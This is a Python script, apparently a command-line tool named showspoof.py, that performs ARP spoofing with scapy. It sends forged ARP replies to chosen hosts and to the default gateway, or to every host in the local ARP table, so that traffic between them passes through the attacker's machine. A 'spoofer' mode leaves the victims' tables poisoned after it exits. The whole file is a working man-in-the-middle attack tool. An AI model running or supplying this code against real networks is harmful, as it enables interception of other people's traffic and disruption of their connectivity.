import scapy.all as scapy
import argparse
import time
import sys
import os
import re





def get_gateway():
    with os.popen('ipconfig') as f:
        a = f.read()
        temp = a.find('Default Gateway . . . . . . . . . :', 800)
        a = a[temp + 36 : a.find('\n', temp)]
    return a

packet_count = 0

def index(list1, obj):
    try:
        a = list1.index(obj)
    except:
        a = -1
    return a
    
def all_ip():
    with os.popen('arp -a') as f:
        data = f.read()
    
    result = []
    arp_table = []
    
    for line in re.findall('([-.0-9]+)\s+([-0-9a-f]{17})\s+(\w+)',data):
        arp_table.append(line)
    a = 0
    
    for i in range(0, len(arp_table)):
        result.append(arp_table[a][0])
        a += 1
    return result

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Specify target ip")
    #parser.add_argument("-g", "--gateway", dest="gateway", help="Specify spoof ip")
    parser.add_argument("-m", "--mode", dest="mode", help="specify mode")
    args, unknown = parser.parse_known_args()
    return args

def get_help(arguments):
    if arguments.target == None or not index(sys.argv, '-?') == -1 or len(sys.argv) == 1:
        print('syntax: showspoof.py <-?> <-m> [-t]\n' +
              "[] means it's required <> means it's optional\n" +
              'help message: -?\n' +
              'mode: -m (mode here)\n' +
              '    deafault: spoof arp tables then when closed restore arp tables\n' +
              '    spoofer: only spoof arp tables and not restoring after\n' +
              '    restore: only restore arp tables\n' +
              'target: -t or --target (target ip here)\n')
        sys.exit()

def get_mac(ip):
    arp_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_packet = broadcast_packet/arp_packet
    answered_list = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
    
    try:
        
        output = answered_list[0][1].hwsrc
        
    except:
        #print(answered_list)
        output = ''
        
        
    
    return output



def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, 4)
    
    
def spoof(target_ip, spoof_ip):
    global packet_count
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
    
    print(f'spoofing {target_ip}')
    
    if target_mac == '':
        print('device not online')
    


arguments = get_arguments()
get_help(arguments)

if arguments.target == 'all':
    targets = all_ip()
    question = input('are you sure you want to attack all? [y/n]')
    if question == 'n':
        print('exiting')
        sys.exit()
else:
    targets = str(arguments.target).split(',')

def restore_routines(arguments):
    if arguments.mode == None:
        print("\n[-] Ctrl + C detected.....Restoring ARP Tables Please Wait!")
    if arguments.mode == 'restore':
        print('\nRestoring ARP Tables Please Wait!')
    if arguments.mode == 'spoofer':
        print('\nCtrl + C detected.....')
    else:
        for i in targets:
            restore(i,get_gateway())
            restore(get_gateway(), i)
    
    print('\n')
    
quited = False
sent_packets = 0
try:
    while True:
        if arguments.mode == None or arguments.mode == 'spoofer':
            for i in targets:
                spoof(i, get_gateway())
                spoof(get_gateway(), i)
        
                sent_packets+=2
        if arguments.mode == 'restore':
            quited = True
            restore_routines(arguments)
            quit()
        print("\r[+] Sent packets: " + str(sent_packets) + '\n'),
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    if not quited:
        restore_routines(arguments)
        sys.exit() 



